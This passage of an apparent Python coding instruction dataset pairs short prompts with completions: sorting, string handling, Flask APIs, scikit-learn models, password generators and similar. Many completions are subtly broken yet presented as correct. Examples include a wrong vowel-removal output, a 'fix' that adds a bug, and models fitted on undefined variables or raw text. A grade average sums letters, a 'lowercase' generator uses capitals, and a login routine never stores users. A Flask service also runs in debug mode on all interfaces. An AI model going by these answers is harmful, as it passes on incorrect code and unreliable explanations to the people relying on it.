tokenized_sentence = nltk.word_tokenize(sentence) # Print out the result print(tokenized_sentence)"},{"prompt":"Write a Python program to remove the vowels from a given sentence. A beautiful sun rises in the morning.","completion":"def removeVowels(my_string): vowels = 'aeiouAEIOU' no_vowels = \\"\\" for char in my_string: if char not in vowels: no_vowels += char return no_vowels sentence = \\"A beautiful sun rises in the morning.\\" print(removeVowels(sentence)) Output: A btfll sn rs s n th mrnn."},{"prompt":"Write a Python script to remove all leading and trailing whitespace from all string data in a list of dictionaries. data = [{'name': 'John Doe ', 'age': 34}, {'name': 'Tim Smith ', 'age': 14}]","completion":"def strip_whitespace_from_data(data): for i in range(len(data)): for key, value in data[i].items(): if isinstance(value, str): data[i][key] = value.strip() return data data = [{'name': 'John Doe ', 'age': 34}, {'name': 'Tim Smith ', 'age': 14}] data = strip_whitespace_from_data(data) print(data)"},{"prompt":"Create a sentiment analysis program in Python which predicts whether the sentiment of a given sentence is positive or negative. Not applicable","completion":"#importing libraries import pandas as pd import numpy as np from nltk.tokenize import word_tokenize from nltk import pos_tag from nltk.corpus import stopwords from nltk.stem import WordNetLemmatizer from sklearn.preprocessing import LabelEncoder from collections import defaultdict from nltk.corpus import wordnet as wn from sklearn.feature_extraction.text import TfidfVectorizer from sklearn import model_selection , naive_bayes , svm from sklearn.metrics import accuracy_score # Define function to tag parts of speech for the text def get_simple_pos(tag): if tag.startswith('J'): return wordnet.ADJ elif tag.startswith('V'): return wordnet.VERB elif tag.startswith('N'): return wordnet.NOUN elif tag.startswith('R'): return wordnet.ADV else: return wordnet.NOUN # Tokenize input text input_sentence = 'This sentence is positive' token_sentence = word_tokenize(input_sentence) # Create a list to store the POS tags pos_token_sentence = pos_tag(token_sentence) # Create an empty list to store the lemmatized words word_lemmatized = [] # Lemmatize the words with POS tags and store in the list for word, tag in pos_token_sentence: wordnet_pos = get_simple_pos(tag) or wordnet.NOUN word_lemmatized.append(lemmatizer.lemmatize(word, pos=wordnet_pos)) # Create a vectorizer object to generate a bag of words tfidf_vect = TfidfVectorizer(tokenizer = word_tokenize, analyzer='word') #Transform the lemmatized text tfidf_sent = tfidf_vect.fit_transform(word_lemmatized) # Create a dataframe for the vectorized text sent_dataset = pd.DataFrame(tfidf_sent.toarray()) sent_df = pd.DataFrame(sent_dataset.toarray()) # Define the model SVM = svm.SVC(C=1.0, kernel='linear', gamma='auto') # Train the model SVM.fit(sent_df,label) # Make predictions predictions = SVM.predict(sent_df) # Print the sentiment if predictions[0] == 0: sentiment = 'Negative' else: sentiment = 'Positive' print('Sentiment: ', sentiment)"},{"prompt":"Generate a Python script that plots the relationship between two variables. x = [1, 2, 3, 4, 5] y = [2, 4, 6, 8, 10]","completion":"import matplotlib.pyplot as plt x = [1, 2, 3, 4, 5] y = [2, 4, 6, 8, 10] plt.plot(x, y) plt.xlabel(\\"x\\") plt.ylabel(\\"y\\") plt.title(\\"Relationship between x and y\\") plt.show()"},{"prompt":"Create a Python script that does linear regression on a given dataset. Not applicable","completion":"import numpy as np import pandas as pd from matplotlib import pyplot as plt import statsmodels.api as sm # Load the data data = pd.read_csv('data.csv') # Add constant to the dataset data = sm.add_constant(data) # Fit the model results = sm.OLS(data['x'], data[['const','y']]).fit() # Get the fitted parameters parameters = results.params # Get the current values of x and y x = data['x'] y = data['y'] # Calculate the predicted values y_pred = parameters[0] + parameters[1] * x # Plot the data and the prediction plt.scatter(x, y, label='Data') plt.plot(x, y_pred, color='r', label='Prediction') plt.legend() plt.show()"},{"prompt":"This code tests the anime filename output. It includes two functions, test_group and test_group_no_epname, which test the output of anime filenames with and without episode names, respectively. The functions use the run_tvnamer and verify_out_data functions from the functional_runner module to test the output against expected files. The functions also use configuration settings to format the output filenames. To run the tests, execute the code.","completion":"#!/usr/bin/env python \\"\\"\\"Tests anime filename output \\"\\"\\" from functional_runner import run_tvnamer, verify_out_data from nose.plugins.attrib import attr @attr(\\"functional\\") def test_group(): \\"\\"\\"Anime filename [#100] \\"\\"\\" out_data = run_tvnamer( with_files = ['[Some Group] Scrubs - 01 [A1B2C3].avi'], with_config = \\"\\"\\" { \\"batch\\": true, \\"filename_anime_with_episode\\": \\"[%(group)s] %(seriesname)s - %(episode)s - %(episodename)s [%(crc)s]%(ext)s\\" } \\"\\"\\") expected_files = ['[Some Group] Scrubs - 01 - My First Day [A1B2C3].avi'] verify_out_data(out_data, expected_files) @attr(\\"functional\\") def test_group_no_epname(): \\"\\"\\"Anime filename, on episode with no name [#100] \\"\\"\\" out_data = run_tvnamer( with_files = ['[Some Group] Somefakeseries - 01 [A1B2C3].avi'], with_config = \\"\\"\\" { \\"batch\\": true, \\"filename_anime_without_episode\\": \\"[%(group)s] %(seriesname)s - %(episode)s [%(crc)s]%(ext)s\\" } \\"\\"\\") expected_files = ['[Some Group] Somefakeseries - 01 [A1B2C3].avi'] verify_out_data(out_data, expected_files)"},{"prompt":"Edit the existing Python code to forward declare a function called compute that takes two arguments, a and b, and returns the result of a + b. def func1(): result = compute(2,3) print(result)","completion":"def compute(a,b): return a + b def func1(): result = compute(2,3) print(result)"},{"prompt":"Design an algorithm in Python to find all the ways a point on the plane can be reached from the origin.","completion":"def find_all_ways(x, y): if x == 0 and y == 0: return [[(0, 0)]] paths = [] if x > 0: paths += find_all_ways(x-1, y) if y > 0: paths += find_all_ways(x, y-1) for path in paths: path.append((x, y)) return paths"},{"prompt":"Python, create a lambda function to input two numbers, and return their product.","completion":"product = lambda x, y : x * y"},{"prompt":"Generate a Python code to create a class which creates an empty dictionary with the given keys. name, age","completion":"class EmptyDictionary: def __init__(self, keys): self.keys = [k.strip() for k in keys.split(\\",\\")] self.dictionary = {k: None for k in self.keys} def get_dictionary(self): return self.dictionary"},{"prompt":"Build a decison tree in Python to classify emails as spam or not spam.","completion":"import pandas as pd from sklearn.tree import DecisionTreeClassifier # Create dataframe df = pd.DataFrame({'content': ['This is a great deal!', 'Buy now!'], 'spam': [0, 1]}) # Create features and labels X = df['content'] y = df['spam'] # Create decision tree dtree_model = DecisionTreeClassifier(max_depth = 2).fit(X, y) dtree_predictions = dtree_model.predict(X) # Print accuracy print(\\"Accuracy:\\", dtree_model.score(X, y))"},{"prompt":"Create a Python script to calculate and display the distance between two points in 2dimensional space. Two points: (5,3) & (2,2)","completion":"import math def distance(p1,p2): x1,y1 = p1 x2,y2 = p2 d = math.sqrt((x2-x1)**2+(y2-y1)**2) return d x1,y1 = (5,3) x2,y2 = (2,2) print(f\\"The distance between 2 points ({x1},{y1}) & ({x2},{y2}) is: {distance((x1,y1),(x2,y2))}\\") // Output: The distance between 2 points (5,3) & (2,2) is: 3.1622776601683795"},{"prompt":"Generate a function in Python to check if an integer is a palindrome. A number is a palindrome if it reads the same forward and backward. Not applicable","completion":"def is_palindrome(num): temp = num rev = 0 while(temp > 0): digit = temp % 10 rev = rev * 10 + digit temp = temp // 10 if rev == num: return True else: return False"},{"prompt":"Generate a random string in Python of length 8 containing only digits and lowercase characters.","completion":"import string, random length = 8 chars = string.ascii_letters + string.digits random_str = ''.join(random.choice(chars) for _ in range(length)) print(random_str)"},{"prompt":"Write a Python program to implement the Bubble Sort algorithm and sort a given list of integers. list = [4, 9, 5, 2, 7, 1]","completion":"def bubble_sort(list): is_sorted = False while not is_sorted: is_sorted = True for i in range(len(list)-1): if (list[i] > list[i+1]): list[i], list[i+1] = list[i+1], list[i] is_sorted = False return list"},{"prompt":"Generate a program to reverse a string in python.","completion":"def reverse_string(string): return string[::-1]"},{"prompt":"Produce a unit test report in Python for a program to find the mean of an array. Sample array: [1, 2, 3, 4, 5]","completion":"import unittest def calculate_mean(numbers): return sum(numbers)/len(numbers) class MeanCalculationTest(unittest.TestCase): def setUp(self): self.sample_array = [1, 2, 3, 4, 5] def test_mean_calculation(self): self.assertEqual(calculate_mean(self.sample_array), 3) if __name__ == '__main__': unittest.main()"},{"prompt":"Design a Python program which takes two lists and returns their intersection. list1 = [1, 2, 3, 4, 5, 6] list2 = [3, 6, 8, 9, 10]","completion":"def intersection(list1, list2): return list(set(list1) & set(list2)) # Output: [3, 6]"},{"prompt":"Create a Python program to calculate the formula 2*sqrt(x+2). x = 10","completion":"import math x = 10 result = 2*math.sqrt(x+2) print(result ) # 12.0"},{"prompt":"mplement an algorithm to determine if a number is prime in Python.","completion":"def is_prime(num): if num < 2: return False for i in range(2, num): if num % i == 0: return False return True"},{"prompt":"Create a web scraper in Python to access the data in a given url https://www.example.com/","completion":"import requests from bs4 import BeautifulSoup url = 'https://www.example.com/' resp = requests.get(url) soup = BeautifulSoup(resp.content, 'html.parser') # Scraping code goes here"},{"prompt":"Design a Python function to automatically generate the next BST level based on the given level. Given level = [1,2,3]","completion":"def generateNextLevel(level): next_level = [] for node in level: if node.left != None: next_level.append(node.left) if node.right != None: next_level.append(node.right) return next_level"},{"prompt":"Create a class in Python to convert raw text into a structured format.","completion":"class TextParser: \\"\\"\\"A class in Python to convert raw text into a structured format\\"\\"\\" def __init__(self, text): self.text = text def parse(self): \\"\\"\\"This method will parse the given text and return it in a structured format\\"\\"\\" # initialize an empty output array output = [] # loop over the lines in the text for line in self.text.split('n'): # split each line into it’s individual words separated by spaces words = line.split(' ') # add each line to the output array output.append(words) return output"},{"prompt":"Write a Python script that finds the most common element of a given list. list = [3, 5, 6, 3, 7, 8, 3, 4]","completion":"def find_most_frequent_element(list): count_map = {} max_element= list[0] max_count = 1 for num in list: if num in count_map: count_map[num] += 1 else: count_map[num] = 1 for num in count_map: if count_map[num] > max_count: max_element = num max_count = count_map[num] return max_element"},{"prompt":"Create a web API with Flask and Python for requesting random articles from a database. Not applicable","completion":"from flask import Flask, request from flask_restful import Resource, Api import sqlite3 app = Flask(__name__) api = Api(app) articles_db = 'articles.db' class getArticle(Resource): def get(self): conn = sqlite3.connect(articles_db) conn.row_factory = sqlite3.Row c = conn.cursor() c.execute('SELECT * FROM articles ORDER BY RANDOM() LIMIT 1') data = c.fetchone() c.close() return { 'article_id': data['article_id'], 'title': data['title'], 'body': data['body'] } api.add_resource(getArticle, '/get_article') if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Generate a python program to extract all the words starting with a given letter given letter: e","completion":"def extract_words(word_list, given_letter): extracted_words=[] for word in word_list: if word[0]==given_letter: extracted_words.append(word) return extracted_words"},{"prompt":"Analyze this Python code and suggest any improvements. def calc_sum(a, b): return a + b sum = 0 for i in range(5): sum += calc_sum(i, i + 1) print(sum)","completion":"def calc_sum(a, b): return a + b sum = 0 for i in range(5): sum += calc_sum(i, i + 1) print(sum) # Suggested fix: sum = 0 for i in range(0, 5): # Use the range(start, stop) syntax sum += sum + calc_sum(i, i + 1) print(sum)"},{"prompt":"Generate a Python script that prints the sum of the numbers in the given range. Start: 10 End: 19","completion":"# Initialize one variable to store result result = 0 # Use a loop to iterate through the given range for num in range(10, 20): result += num # Print the result print(result)"},{"prompt":"mplement a Python function to find the smallest element in an array [3, 5, 2, 1, 4]","completion":"def findSmallest(arr): smallest = arr[0] for i in arr: if i < smallest: smallest = i return smallest findSmallest([3, 5, 2, 1, 4]) # Output: 1"},{"prompt":"Write a Python program to check whether a number is divisible by 7 or not. 92","completion":"number = 92 if (number % 7) == 0: print(\\"The number is divisible by 7\\") else: print(\\"The number is not divisible by 7\\")"},{"prompt":"Generate a Python class to represent a customer object with the following properties: name, email, and phone number. Not applicable","completion":"class Customer: def __init__(self, name, email, phone_number): self.name = name self.email = email self.phone_number = phone_number def getName(self): return self.name def getEmail(self): return self.email def getPhoneNumber(self): return self.phone_number"},{"prompt":"Write a Python code to create a program that will generate a random password.","completion":"import string import random def generate_password(length): password = \\"\\" for i in range(length): password += random.choice(string.ascii_letters + string.digits + string.punctuation) return password"},{"prompt":"Construct a function in Python that takes in a number as an argument and prints out the double of the input. Not applicable","completion":"def double_num(n): return n*2 print(double_num(5)) # Outputs: 10"},{"prompt":"Create a Python function to tokenize sentences into words. The quick brown fox jumped over the lazy dog.","completion":"def tokenize(sentence): tokens = [] current_word = \\"\\" for char in sentence: if char.isalpha(): current_word += char else: if current_word: tokens.append(current_word) current_word = \\"\\" if char.isnumeric(): tokens.append(char) if current_word: tokens.append(current_word) return tokens print(tokenize('The quick brown fox jumped over the lazy dog.')) # ['The', 'quick', 'brown', 'fox', 'jumped', 'over', 'the', 'lazy', 'dog']"},{"prompt":"Generate a Python program to scrape the content of an HTTPS website and output the result. Not applicable","completion":"import requests from bs4 import BeautifulSoup # make a get request to fetch the contents of the page r = requests.get('https://example.com') # parse the html content soup = BeautifulSoup(r.content, 'html.parser') # print out the result print(soup.prettify())"},{"prompt":"Generate a Python program to merge two dictionaries. dict1 = {'a':1, 'b':2, 'c':3} dict2 = {'d':4, 'e':5, 'f':6}","completion":"dict1 = {'a':1, 'b':2, 'c':3} dict2 = {'d':4, 'e':5, 'f':6} dict3 = {**dict1, **dict2} print(dict3) # Output: {'a': 1, 'b': 2, 'c': 3, 'd': 4, 'e': 5, 'f': 6}"},{"prompt":"Write a Python code to return the highest frequency element in a given array of integers. arr = [1, 2, 4, 2, 3, 2]","completion":"from collections import Counter def highest_frequency(arr): arr_counts = Counter(arr) max_freq = 0 max_freq_num = 0 for num in arr_counts: if arr_counts[num] > max_freq: max_freq = arr_counts[num] max_freq_num = num return max_freq_num print(highest_frequency(arr))"},{"prompt":"Generate a web service in Python Flask to provide the weather data for a given date and region.","completion":"# Import packages from flask import Flask, jsonify, request import requests # Create Flask app app = Flask(__name__) # Make a GET request to fetch weather data for a given date and region @app.route('/weather', methods=['GET']) def get_weather_data(): region = request.args.get('region') date = request.args.get('date') url = 'http://api.openweathermap.org/data/2.5/forecast?q='+region+'&appid= YOUR_API_KEY'+'&date='+date data = requests.get(url).json() return jsonify(data) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug = True)"},{"prompt":"Create a Python script to check whether a given number is an even number or an odd number.","completion":"def is_even(n): if n % 2 == 0: return True else: return False"},{"prompt":"Construct a machine learning model in Python to predict whether a customer will buy a product or not. Features of customer: Age: 34 Gender: Male Homeowner: Yes Education: Bachelor's Marital Status: Married Employment: PartTime Income: 50,000","completion":"#import relevant libraries import pandas as pd import numpy as np from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier #define customer data customer_data = { 'Age': [34], 'Gender': ['Male'], 'Homeowner': [1], 'Education': [1], 'Marital Status': [1], 'Employment': [2], 'Income': [50000], } #convert to a dataframe customer_data_df = pd.DataFrame(customer_data, columns=['Age', 'Gender', 'Homeowner', 'Education', 'Marital Status', 'Employment', 'Income']) #load data data = pd.read_csv('data.csv') #create the features for our model features = [x for x in data.columns if x not in ['label']] #split into data and labels X = data[features] y = data['label'] #split into training and testing sets X_train, X_test, y_train, y_test = train_test_split(X, y, random_state=42) #fit a random forest model model = RandomForestClassifier(n_estimators=100) model.fit(X_train, y_train) #get the customer's prediction prediction = model.predict(customer_data_df)[0] if prediction == 0: print(\\"Customer is not likely to buy the product.\\") else: print(\\"Customer is likely to buy the product.\\")"},{"prompt":"Write a Python program to calculate the standard deviation of a given list of numbers. [1, 2, 3, 4]","completion":"def calculate_sd(lst): avg = sum(lst) / len(lst) return (sum([(x - avg)**2 for x in lst]) / len(lst)) ** 0.5"},{"prompt":"Write a Python program to split a given string into substrings of fixed length, and print the substrings in a single line seperated by comma. PythonProgramming","completion":"def split_string(string, length): substrings = [string[i:i+length] for i in range(0, len(string), length)] return ','.join(substrings)"},{"prompt":"Design a machine learning model in Python which can detect if a given document is written in British English or American English.","completion":"import pandas as pd from sklearn.model_selection import train_test_split from sklearn.feature_extraction.text import CountVectorizer from sklearn.naive_bayes import MultinomialNB from sklearn.metrics import accuracy_score, precision_score, recall_score # Read data into a dataframe df = pd.read_csv('data.csv') # Define predictors and the target X = df['text'] y = df['language'] # Split in train and test sets X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.20, random_state=42) # Initialise and fit a CountVectorizer cv = CountVectorizer(analyzer='word', ngram_range=(1,2)) X_train_cv = cv.fit_transform(X_train) X_test_cv = cv.fit_transform(X_test) # Initialise and fit a MultinomialNB model nb = MultinomialNB() nb.fit(X_train_cv, y_train) # Make predictions y_pred = nb.predict(X_test_cv) # Print metrics print(\\"Accuracy score: %.2f\\" % accuracy_score(y_test, y_pred)) print(\\"Precision score: %.2f\\" % precision_score(y_test, y_pred, average='macro')) print(\\"Recall score: %.2f\\" % recall_score(y_test, y_pred, average='macro'))"},{"prompt":"Construct an algorithm in Python to compute the maximum profit from selling a stock within a specific period of days. [8, 12, 4, 5, 7, 10, 9]","completion":"def max_profit(prices): min_price = float('inf') max_profit = 0 for price in prices: min_price = min(min_price, price) max_profit = max(max_profit, price - min_price) return max_profit prices = [8, 12, 4, 5, 7, 10, 9] print(max_profit(prices))"},{"prompt":"Develop a minigame in Python where the user can play rock, paper and scissors against the computer.","completion":"import random def check_winner(user_choice, computer_choice): if user_choice == computer_choice: return 'Draw' elif (user_choice == 'rock' and computer_choice == 'paper') or (user_choice == 'paper' and computer_choice == 'scissors') or (user_choice == 'scissors' and computer_choice == 'rock'): return 'Computer won!' else: return 'You won!' def play_rock_paper_scissors(): items = ['rock', 'paper', 'scissors'] user_choice = input(\\"Choose rock, paper, or scissors:\\") computer_choice = random.choice(items) result = check_winner(user_choice, computer_choice) print(\\"Computer chose {}.\\".format(computer_choice)) print(\\"{}\\".format(result)) play_rock_paper_scissors()"},{"prompt":"Design a class in Python with instance attributes for name, height, and age of a person. Not applicable","completion":"class Person: def __init__(self, name, height, age): self.name = name self.height = height self.age = age"},{"prompt":"Predict the output for the following Python code snippet. a = [1, 2, 3, 4] b = [2, 4, 5, 7]","completion":"c = [3, 6, 8, 11]"},{"prompt":"Build a web scraping script in Python that stores the HTML content of a website in a variable. URL: https://www.example.com","completion":"import urllib.request url = 'https://www.example.com' html_content = urllib.request.urlopen(url).read()"},{"prompt":"Create a Python program to check if a given number is in a given linear list or not, and return the position if found. List: [2, 3, 5, 6, 8, 9], Number: 5","completion":"def is_in_linear_list(lst, num): for i, val in enumerate(lst): if val == num: return \\"Found at {0} position\\".format(i) return False lst = [2, 3, 5, 6, 8, 9] num = 5 result = is_in_linear_list(lst, num) print(result)"},{"prompt":"Create a method in Python that takes two arguments and returns a specified error message if one of the two conditions is not met. error_message = The input must be a number!","completion":"def check_input(arg1, arg2): if type(arg1) is not int or type(arg2) is not int: return \\"The input must be a number!\\" else: return \\"The input is valid!\\""},{"prompt":"What are the advantages of using a set data structure in Python?","completion":"The main advantages of using a set data structure in Python are that it is unordered, meaning that the elements in a set are not stored in a particular order, and that it is unindexed, meaning that each element must be referenced based on its value. Additionally, because sets do not contain duplicate elements, they are useful for performing various operations on a dataset such as searching, filtering, and removing duplicate elements. Finally, using sets can improve the speed of the overall code since different operations may have O(1) time complexity."},{"prompt":"Develop a program to sort an list of strings by their length using Python. ['dog', 'cat', 'mouse', 'elephant']","completion":"def sort_by_length(strings): return sorted(strings, key=len) # Test strings = ['dog', 'cat', 'mouse', 'elephant'] print(sort_by_length(strings))"},{"prompt":"Create a program in Python that reads a text and then prints out the longest word in the text. This is an example of a sample text.","completion":"def find_longest_word(text): words = text.split(\\" \\") longest = \\"\\" for word in words: if len(word) > len(longest): longest = word return longest if __name__ == \\"__main__\\": text = \\"This is an example of a sample text.\\" print(find_longest_word(text))"},{"prompt":"Create a Python script to generate a Fibonacci sequence of the specified length, given an initial twonumber sequence. initial_sequence = [1, 1], sequence_length = 5","completion":"def generate_fibonacci_sequence(initial_sequence, sequence_length): fibonacci_sequence = initial_sequence for i in range(2, sequence_length): fibonacci_sequence.append(fibonacci_sequence[i-1] + fibonacci_sequence[i-2]) return fibonacci_sequence sequence = generate_fibonacci_sequence([1, 1], 5) print(sequence)"},{"prompt":"Format the following code to meet the style guidelines of Python. class Building(): def __init__(self,size ='medium'): self.size = size if self.size == 'small': self.rooms = 2 elif self.size == 'medium': self.rooms = 3 else: self.rooms = 4","completion":"class Building: def __init__(self, size=\\"medium\\"): self.size = size if self.size == \\"small\\": self.rooms = 2 elif self.size == \\"medium\\": self.rooms = 3 else: self.rooms = 4"},{"prompt":"dify the following Python program such that it returns an error if the input is an empty string. def print_string(text): print(text)","completion":"def print_string(text): if len(text) > 0: print(text) else: raise Exception('The input string is empty')"},{"prompt":"Develop an algorithm in Python for clustering a set of data points. Input Data (x, y, z): [(1, 2, 3), (4, 5, 6), (7, 8, 9)]","completion":"from sklearn.cluster import KMeans import numpy as np # Create array of the data points data_points = np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]) # Calculate clusters kmeans = KMeans(n_clusters=3).fit(data_points) # Get labels for each point labels = kmeans.predict(data_points) # Print clusters print(labels) # Output: [0, 1, 2]"},{"prompt":"Write a Python program to delete keys from a dictionary whose value is equal to a given value. my_dict = {'a':1, 'b':2, 'c':3, 'd':2} value = 2","completion":"def delete_keys(my_dict, value): \\"\\"\\"This function deletes keys from a dictionary whose value is equal to a given value.\\"\\"\\" keys_to_remove = [] for key, val in my_dict.items(): if val == value: keys_to_remove.append(key) for key in keys_to_remove: del my_dict[key] return my_dict my_dict = {'a':1, 'b':2, 'c':3, 'd':2} value = 2 new_dict = delete_keys(my_dict, value) print(new_dict)"},{"prompt":"This code is a Python script that loads ordered data from a folder to a PostgreSQL database using PDAL. To use this script, create an instance of the LoaderOrdered class and call its process() method. The LoaderOrdered class extends the Loader class and overrides its getFileBlockTable(), loadFromFile(), and loadFromFileSequential() methods. The loadFromFile() method loads a file into the database using PDAL, while the loadFromFileSequential() method inserts the blocks of a file into the global blocks table in the correct order. The process() method loads the files in parallel using the loadFromFile() and loadFromFileSequential() methods.","completion":"#!/usr/bin/env python # Created by Oscar Martinez # # o.rubi@esciencecenter.nl # import os, logging from pointcloud import pdalops, postgresops from pointcloud.postgres.blocks.Loader import Loader class LoaderOrdered(Loader): def getFileBlockTable(self, index): return self.blockTable + '_' + str(index) def process(self): logging.info('Starting ordered data loading with PDAL (parallel by python) from ' + self.inputFolder + ' to ' + self.dbName) return self.processMulti(self.inputFiles, self.numProcessesLoad, self.loadFromFile, self.loadFromFileSequential, True) def loadFromFile(self, index, fileAbsPath): # Get connection connection = self.getConnection() cursor = connection.cursor() #Create a temporal blocks table for the blocks of the current file fileBlockTable = self.getFileBlockTable(index) self.createBlocksTable(cursor, fileBlockTable, self.indexTableSpace) # We use the index table space for the temporal table # Add point cloud format to poinctcloud_formats table (columns, pcid, compression) = self.addPCFormat(cursor, self.schemaFile, fileAbsPath, self.srid) connection.close() pdalCols = [] for c in cols: pdalCols.append(self.DM_PDAL[c]) # Get PDAL config and run PDAL xmlFile = os.path.basename(fileAbsPath) + '.xml' pdalops.PostgreSQLWriter(xmlFile, fileAbsPath, self.getConnectionString(), pcid, pdalCols, fileBlockTable, self.srid, self.blockSize, compression) pdalops.executePDAL(xmlFile) def loadFromFileSequential(self, fileAbsPath, index, numFiles): fileBlockTable = self.getFileBlockTable(index) connection = self.getConnection() cursor = connection.cursor() # Insert the blocks on the global blocks table (with correct order) query = \\"INSERT INTO \\" + self.blockTable + \\" (pa) SELECT pa FROM \\" + fileBlockTable + \\" ORDER BY id\\" postgresops.mogrifyExecute(cursor, query) # Drop the temporal table postgresops.dropTable(cursor, fileBlockTable) connection.close()"},{"prompt":"Analyze a Python program to remove all global variables and replace them with local variables. a = 1 def foo(): print(a) def bar(): global a a = 2 foo() bar()","completion":"def foo(): a = 1 print(a) def bar(): a = 2 foo() bar()"},{"prompt":"Generate a code in Python for validating a given password Minimum length of 8 characters and must contain at least 1 uppercase letter, 1 lowercase letter, 1 special character and 1 number","completion":"import re def validate_password(passwd): Rule = re.compile(r\\"^(?=.*[a-z])(?=.*[A-Z])(?=.*d)(?=.*[@!%*#?&])[A-Za-zd@!#%*?&]{8,}\\") return Rule.search(passwd)"},{"prompt":"Create a Python program to transform text into pig latin.","completion":"def pig_latin(word): first_letter = word[0] # check if vowel if first_letter in 'aeiou': pig_word = word+'ay' else: pig_word = word[1:]+first_letter+'ay' return pig_word if __name__=='__main__': word = 'apple' print(pig_latin(word)) # prints 'appleay'"},{"prompt":"Write a python code to generate a random password with at least 8 characters that includes at least one lower case letter, one upper case letter and one number.","completion":"\\"\\"\\" Write a python code to generate a random password with at least 8 characters that includes at least one lower case letter, one upper case letter and one number \\"\\"\\" import string import random def generate_password(): letters = string.ascii_letters digits = string.digits symbols = string.punctuation all_chars = letters + digits + symbols password = \\"\\".join(random.choice(all_chars) for i in range(8)) lower_count = 0 upper_count = 0 digit_count = 0 for char in password: if char.islower(): lower_count += 1 elif char.isupper(): upper_count += 1 elif char.isdigit(): digit_count += 1 while lower_count == 0 or upper_count == 0 or digit_count == 0: password = \\"\\".join(random.choice(all_chars) for i in range(8)) lower_count = 0 upper_count = 0 digit_count = 0 for char in password: if char.islower(): lower_count += 1 elif char.isupper(): upper_count += 1 elif char.isdigit(): digit_count += 1 return password if __name__ == '__main__': print(generate_password())"},{"prompt":"Develop a function in Python to find the largest two numbers in a given array. input_array = [1, 9, 5, 2, 4, 7]","completion":"def find_largest_two(input_array): largest1, largest2 = -float(\\"inf\\"), -float(\\"inf\\") if len(input_array)<2: return for el in input_array: if el > largest1: largest2 = largest1 largest1 = el elif el > largest2: largest2 = el return largest1,largest2"},{"prompt":"Create a basic authentication system in Python using hashing and salting. Not applicable","completion":"import hashlib import random import string # Generate a salt def generate_salt(): salt = ''.join(random.choice(string.ascii_letters) for _ in range(16)) return salt # Generate a hashed password def generate_hashed_password(password, salt): hashed_password = hashlib.sha256(password.encode() + salt.encode()).hexdigest() return hashed_password # Create a user def create_user(username, password): # Generate a new salt salt = generate_salt() # Create a hashed password hashed_password = generate_hashed_password(password, salt) # Store the user data user = { 'username': username, 'salt': salt, 'hashed_password': hashed_password } # Login def login(username, password): # Get the user data user = get_user(username) # Generate a hashed password hashed_password = generate_hashed_password(password, user['salt']) # Compare the passwords if user['hashed_password'] == hashed_password: login_success() else: login_failure()"},{"prompt":"Develop a program in Python that will take a list of numbers as input and calculate the median of the numbers numbers = [10,50,30,20,60]","completion":"def find_median(numbers): numbers.sort() if len(numbers) % 2 == 0: median1 = numbers[len(numbers)//2] median2 = numbers[len(numbers)//2 - 1] median = (median1 + median2)/2 else: median = numbers[len(numbers)//2] return median # Driver Code numbers = [10,50,30,20,60] median = find_median(numbers) print(\\"Median is: \\" + str(median))"},{"prompt":"Write a function in Python that calculates the average of two numeric values. Not applicable","completion":"def avg(x, y): \\"\\"\\" Calculates the average of two numbers Args: x (float): The first number y (float): The second number Returns: avg (float): The average of the two numbers \\"\\"\\" return (x + y) / 2"},{"prompt":"Write a Python program to implement a decision tree using a given dataset. The dataset contains 10,000 examples and 5 features.","completion":"import numpy as np from sklearn import tree # Load the data X = np.loadtxt('data.txt', delimiter=',') # Create a decision tree model clf = tree.DecisionTreeClassifier() clf.fit(X, y) # print the model tree tree.export_graphviz(clf, out_file=\\"model.dot\\")"},{"prompt":"Generate a Python script to find the average grade across all students enrolled in a given class. { students: [ { name: John, grade: A }, { name: Zoe, grade: C }, { name: Susie, grade: B } ] }","completion":"def get_average_grade(students): grades = [] for student in students: grades.append(student['grade']) return sum(grades)/len(students) if __name__ == '__main__': students = [{ 'name': 'John', 'grade': 'A' }, { 'name': 'Zoe', 'grade': 'C' }, { 'name': 'Susie', 'grade': 'B' }] average_grade = get_average_grade(students) print('Average Grade: {}'.format(average_grade))"},{"prompt":"Create a neural network class in Python that computes the derivative of a given function.","completion":"class NNClass: def __init__(self): pass def forward(self, x): self.x = x def backward(self, dy): dFdx = dy * (1/self.x) return dFdx"},{"prompt":"Create a Python program that will print out all of the prime numbers between 0 and 100. Not applicable","completion":"for num in range(2,101): prime = True for i in range(2,num): if (num%i==0): prime = False if prime: print(num)"},{"prompt":"Create an objectoriented program in python that allows user to add, update, delete and search an item in a catalogue.","completion":"class ItemCatalogue(): def __init__(self): self.items = {} def add(self, item_name, item_details): self.items[item_name] = item_details def update(self, item_name, item_details): self.items[item_name] = item_details def delete(self, item_name): del self.items[item_name] def search(self, item_name): if item_name in self.items: return self.items[item_name] else: return None"},{"prompt":"Formulate an algorithm in Python to find the sum of all elements in a given matrix. [[ 1, 2, 3 ], [ 4, 5, 6 ]]","completion":"def matrixSum(matrix): sum = 0 for row in matrix: for element in row: sum += element return sum matrix = [[1, 2, 3], [4, 5, 6]] total = matrixSum(matrix) print(total)"},{"prompt":"Write a Python program for generating a password that meets the following criteria: Length 8 characters, At least one lowercase letter, At least one uppercase letter, At least one special character","completion":"import random import string def generate_password(length, lowercase, uppercase, special): characters = string.ascii_letters + string.digits + '!\\"#%&'()*+,-./:;<=>?@[]^_{|}~' password = '' for i in range(length): if lowercase > 0: password += random.choice(string.ascii_lowercase) lowercase -= 1 elif uppercase > 0: password += random.choice(string.ascii_uppercase) uppercase -= 1 elif special > 0: password += random.choice(special) special -= 1 else: password += random.choice(characters) return password print(generate_password(8, 1, 1, 1))"},{"prompt":"mplements an algorithm in Python to find common elements in two given unsorted arrays. [1, 2, 3], [2, 4, 5]","completion":"def common_elements(arr1, arr2): commonList = [] for num1 in arr1: for num2 in arr2: if(num1 == num2): commonList.append(num1) return commonList arr1 = [1, 2, 3] arr2 = [2, 4, 5] print (\\"Common elements: \\", common_elements(arr1, arr2))"},{"prompt":"Create a REST API to search for a user in the database.","completion":"A REST API can be created using programming languages such as Python, JavaScript, etc. It will contain code to connect to the database, query it for a user, and return a response in the appropriate format."},{"prompt":"Generate a Python script to iterate through a list and print each element. lst = [hello, how, are, you]","completion":"for item in lst: print(item)"},{"prompt":"Design an algorithm in Python to find the highest one digit number in a given list. [5, 11, 15, 8, 9]","completion":"def get_highest_one_digit(list_nums): highest_num = 0 for num in list_nums: if num <= 9 and num > highest_num: 